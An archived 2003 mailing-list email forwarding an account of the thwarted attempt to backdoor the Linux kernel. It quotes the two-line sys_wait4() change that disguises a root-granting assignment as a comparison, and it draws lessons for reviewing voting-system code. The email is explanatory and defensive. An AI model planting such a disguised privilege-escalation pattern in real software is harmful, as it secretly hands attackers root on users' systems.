@@ -1,0 +1,111 @@
+From owner-cypherpunks@lne.com  Thu Nov 13 05:51:21 2003
+Return-Path: <owner-cypherpunks@lne.com>
+Received: from slack.lne.com (gw.lne.com [209.157.136.81])
+	by positron.jfet.org (8.11.6p3/8.11.6-03-31-03) with ESMTP id hADApJq28297
+	for <rsw@jfet.org>; Thu, 13 Nov 2003 05:51:19 -0500
+Received: from slack.lne.com (slack.lne.com [127.0.0.1])
+	by slack.lne.com (8.12.10/8.12.10) with ESMTP id hADAZZGC021019
+	(version=TLSv1/SSLv3 cipher=EDH-DSS-DES-CBC3-SHA bits=168 verify=NO)
+	for <cypherpunks-goingout345@slack.lne.com>; Thu, 13 Nov 2003 02:35:35 -0800
+Received: (from majordom@localhost)
+	by slack.lne.com (8.12.10/8.12.10/Submit) id hADAZZQr021018
+	for cypherpunks-goingout345; Thu, 13 Nov 2003 02:35:35 -0800
+X-Authentication-Warning: slack.lne.com: majordom set sender to owner-cypherpunks@lne.com using -f
+Date: Thu, 13 Nov 2003 11:35:30 +0100
+From: Eugen Leitl <eugen@leitl.org>
+To: transhumantech@yahoogroups.com, cypherpunks@lne.com
+Subject: [s-t] How a backdoor in the Linux kernel was thwarted (fwd)
+  (fwd from amerritt@spasticmutant.com)
+Message-ID: <20031113103530.GB922@leitl.org>
+Mime-Version: 1.0
+Content-Type: text/plain; charset="us-ascii"
+Content-Disposition: inline
+User-Agent: Mutt/1.4i
+X-Converted-To-Plain-Text: from multipart/signed by demime 0.97c
+X-Converted-To-Plain-Text: Alternative section used was text/plain
+Sender: owner-cypherpunks@lne.com
+Precedence: bulk
+X-Loop: cypherpunks@lne.com
+Status: O
+Content-Length: 3230
+Lines: 78
+
+----- Forwarded message from Spastic Mutant <amerritt@spasticmutant.com>
+-----
+
+From: Spastic Mutant <amerritt@spasticmutant.com>
+Date: Wed, 12 Nov 2003 14:55:05 -0800 (PST)
+Subject: [s-t] How a backdoor in the Linux kernel was thwarted (fwd)
+
+
+
+Forwarded around quite a bit - I thought I'd pass it on and maybe some of
+the more Linux-involved s-t'ers can confirm or deny the story.  I didn't
+see it on /., but I vaguely recall reading someplace random that the 2.6
+CVS kernel tree was temporarily out of service last week, though I don't
+remember exactly the reason.
+
+http://kerneltrap.org/node/view/1584
+
+Anne Marie
+
+-=-=-=-
+
+Date: Tue, 11 Nov 2003 09:21:16 -0600
+From: "Douglas W. Jones" <jones@cs.uiowa.edu>
+Subject: Thwarted Linux backdoor
+
+On 5 Nov 2003, an attempt to insert a very cleverly crafted backdoor into
+Linux was averted.  This is a really good example of the subtle kinds of
+hacks a source code examiner must be waiting to catch if we want genuinely
+secure voting systems under the current model of proprietary DRE systems
+with a closed-door source code examination.
+
+Someone broke into a server at kernel.kbits.net and inserted the following
+code into the Linux kernel:
+
+         if ((options == (__WCLONE|__WALL)) && (current->uid = 0))
+                         retval = -EINVAL;
+
+This was done in the code sys_wait4().  Larry McVoy caught the fact that the
+change had been made, and was annoyed because it wasn't logged properly.
+Matthew Dharm asked "Out of curiosity, what were the changed lines."  Zwane
+Mwaikambo responded "That looks odd", and Andries Brouwer responded "Not if
+you hope to get root."
+
+So, an annoying violation of the software change logging requirements turned
+out to be an attempt to install a backdoor in Linux.  At least two very
+experienced programmers looked at it and saw just slightly odd code, before
+the serious nature of the threat was actually discovered.
+
+This particular attack, by the way, is ruled out by the current voting
+system standards, not because they require a comprehensive security
+analysis, but because of their C-centered coding rules.  Embedded assignment
+is forbidden.  Current source code checks are good at finding embedded
+assignments and flagging them (as long as the code is written in C).  No
+doubt, a hacker of the sophistication suggested by the attack illustrated
+above would strictly adhere to the coding guidelines in formulating their
+attack.
+
+For the complete story of this attack on Linux, including the actual E-mail
+exchange documenting the discovery of the attack, see:
+
+     http://kerneltrap.org/node/view/1584
+     Linux: Kernel "Back Door" Attempt
+
+This attack has only made the mainstream media in one place, so far:
+
+     http://www.smh.com.au/articles/2003/11/07/1068013371170.html
+     Bid to backdoor Linux kernel detected - smh.com.au
+
+This is a pity, because I think this story is really important.
+
+
+----- End forwarded message -----
+-- Eugen* Leitl <a href="http://leitl.org">leitl</a>
+______________________________________________________________
+ICBM: 48.07078, 11.61144 http://www.leitl.org
+8B29F6BE: 099D 78BA 2FD3 B014 B08A  7779 75B0 2443 8B29 F6BE
+
+[demime 0.97c removed an attachment of type application/pgp-signature]
+
